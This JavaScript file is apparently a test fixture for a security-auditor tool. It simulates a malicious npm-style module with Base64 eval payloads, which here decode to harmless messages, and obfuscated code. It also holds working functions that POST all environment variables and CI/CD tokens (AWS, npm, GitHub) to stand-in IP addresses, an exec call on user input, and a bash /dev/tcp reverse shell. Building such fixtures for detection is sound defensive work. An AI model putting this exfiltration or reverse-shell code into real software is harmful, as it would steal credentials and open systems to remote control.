// @ts-nocheck
/**
 * FIXTURE FILE — Simulated malicious utility module.
 * Demonstrates: eval(atob()), credential harvesting, backdoor fetch, obfuscation.
 * DO NOT USE. THIS IS A TEST FIXTURE FOR THE SECURITY AUDITOR.
 */

// ── MALWARE 1: Base64-decoded eval payload ────────────────────────────────────
// Classic supply-chain obfuscation: malicious code hidden in a Base64 blob.

(function initModule() {
  const _payload = "Y29uc29sZS5sb2coJ21hbHdhcmUgZXhlY3V0ZWQnKQ==";
  eval(atob(_payload));
})();

// ── MALWARE 2: Credential harvesting via process.env ─────────────────────────
// Collects ALL environment variables and POSTs them to an attacker's server.

async function reportMetrics() {
  const envData = JSON.stringify(process.env);

  await fetch("https://203.0.113.42:8080/collect", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: envData,
  });
}

// ── MALWARE 3: Targeted secret extraction ────────────────────────────────────
// Specifically targets high-value CI/CD credentials.

function collectSecrets() {
  return {
    aws: process.env.AWS_ACCESS_KEY_ID,
    awsSecret: process.env.AWS_SECRET_ACCESS_KEY,
    npmToken: process.env.NPM_TOKEN,
    githubToken: process.env.GITHUB_TOKEN,
    nodeAuth: process.env.NODE_AUTH_TOKEN,
  };
}

// ── MALWARE 4: Hardcoded IP-based exfiltration ────────────────────────────────
// Sends data back to attacker's C2 server via raw IP (avoids DNS-based detection).

async function exfiltrateData(data) {
  await fetch("https://192.168.1.100/exfil", {
    method: "POST",
    body: JSON.stringify({ payload: data, host: process.env.HOSTNAME }),
  });
}

// ── MALWARE 5: Obfuscated JS (_0x pattern) ────────────────────────────────────
// javascript-obfuscator output — hides malicious intent from code review.

var _0x1a2b = ["\\x63\\x6f\\x6e\\x73\\x6f\\x6c\\x65", "\\x6c\\x6f\\x67"];
var _0x3c4d = function(_0x5e6f, _0x7a8b) { return _0x1a2b[_0x5e6f]; };
(function() { _0x3c4d(0)[_0x3c4d(1)]("obfuscated payload executed"); })();

// ── MALWARE 6: Long Base64 blob (encoded second-stage payload) ────────────────

const STAGE_TWO_PAYLOAD =
  "SGVsbG8gV29ybGQgLSBUaGlzIGlzIGEgZmFrZSBzZWNvbmQtc3RhZ2UgcGF5bG9hZCBmb3IgdGVzdGluZyB0aGUgc2VjdXJpdHkgYXVkaXRvciBzY2FubmVyLiBJdCBpcyBub3QgcmVhbCBtYWx3YXJlLiBJdCBpcyBqdXN0IGEgbG9uZyBlbm91Z2ggYmFzZTY0IHN0cmluZyB0byB0cmlnZ2VyIHRoZSBkZXRlY3Rpb24gcnVsZSBpbiB0aGUgc2VjdXJpdHkgYXVkaXRvciBtb2R1bGUgd2UgYXJlIGJ1aWxkaW5nLg==";

function loadSecondStage() {
  eval(Buffer.from(STAGE_TWO_PAYLOAD, "base64").toString("utf8"));
}

// ── MALWARE 7: Child process with dynamic command ─────────────────────────────

const { exec } = require("child_process");

function runCommand(userCommand) {
  // INSECURE: executes user-controlled command in shell
  exec(userCommand, (err, stdout) => {
    console.log(stdout);
  });
}

// ── MALWARE 8: Reverse shell indicator ────────────────────────────────────────

function connectBack(host, port) {
  const cmd = `bash -i >& /dev/tcp/${host}/${port} 0>&1`;
  exec(cmd);
}

module.exports = { reportMetrics, collectSecrets, exfiltrateData, runCommand };
